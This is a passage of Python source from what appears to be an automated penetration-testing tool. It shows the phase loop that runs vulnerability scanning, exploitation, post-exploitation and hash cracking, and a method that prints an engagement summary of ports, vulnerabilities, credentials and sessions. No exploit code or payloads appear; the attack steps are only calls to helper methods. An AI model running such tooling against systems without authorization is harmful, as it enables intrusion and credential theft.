                    "VULN_SCAN",
                )
                # Run verification after vuln scan
                self._run_verification(target)

            elif phase_id == "EXPLOIT":
                session_ok = self._exploitation_phase(target)
                self.findings.host_info["compromised"] = session_ok
                if self._state:
                    self._state.record_phase(
                        "EXPLOIT",
                        session_ok,
                        reason="" if session_ok else "no session opened",
                    )
            elif phase_id == "POST_EXPLOIT":
                if self.findings.host_info.get("compromised"):
                    self._post_exploit_phase(target)
                else:
                    info("no session — skipping post-exploitation")
                    if self._state:
                        self._state.record_phase(
                            "POST_EXPLOIT",
                            False,
                            "no session available",
                        )
            elif phase_id == "HASH_CRACK":
                self._crack_hashes()

        self._final_summary(target, time.time() - t0)
        self._save_session("completed")
        self.dispatcher.canonical_target = None

    def _final_summary(self, target: str, duration: float) -> None:
        rc = self.findings.overall_risk
        rc_color = {
            "CRITICAL": P.RED,
            "HIGH": P.AMBER,
            "MEDIUM": P.YELLOW,
            "LOW": P.BLUE,
            "NONE": P.DIM,
        }.get(rc, P.DIM)
        console.print()
        div("ENGAGEMENT COMPLETE")
        console.print()
        label("target", target)
        label("duration", f"{duration:.0f}s   ({duration / 60:.1f} min)")
        console.print()
        label("ports", str(len(self.findings.ports)))
        label(
            "vulns",
            f"{len(self.findings.vulns)}  "
            f"(C:{self.findings.critical_count} "
            f"H:{self.findings.high_count} "
            f"M:{self.findings.medium_count} "
            f"L:{self.findings.low_count})",
        )
        label(
            "verified",
            f"{self.findings.verified_count} confirmed  "
            f"{self.findings.unverified_count} unconfirmed",
        )
        label("hashes", str(len(self.findings.hashes)))
        label("credentials", str(len(self.findings.credentials)))
        label("sessions", str(len(self.findings.sessions)))
        label("web dirs", str(len(self.findings.dirs)))
        console.print()
        console.print(f"  [{P.MUTED}]{'risk'.ljust(14)}[/]  [bold {rc_color}]{rc}[/]")
        # PlannerState summary
        if self._state:
            summary = self._state.summary()
            console.print(
                f"  [{P.MUTED}]{'phases'.ljust(14)}[/]  "
                f"[{P.TEXT}]{summary['phases_succeeded']} succeeded  "
                f"{summary['phases_failed']} failed[/]"
            )
        console.print()
        div()
